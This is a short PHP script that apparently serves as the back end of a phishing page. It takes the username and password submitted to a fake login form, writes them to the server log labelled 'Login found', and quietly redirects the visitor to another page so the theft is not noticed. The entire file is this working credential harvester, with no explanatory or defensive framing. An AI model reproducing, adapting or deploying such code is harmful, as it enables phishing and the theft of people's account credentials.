<?php
error_log("-----------------------------------------------------------------------\n Login found\n...");
error_log("\n Account: " . $_POST['username'] . " \n Pass: " . $_POST['password'] );
error_log("...\n-----------------------------------------------------------------------");
header('Location:/index3.html');
exit();
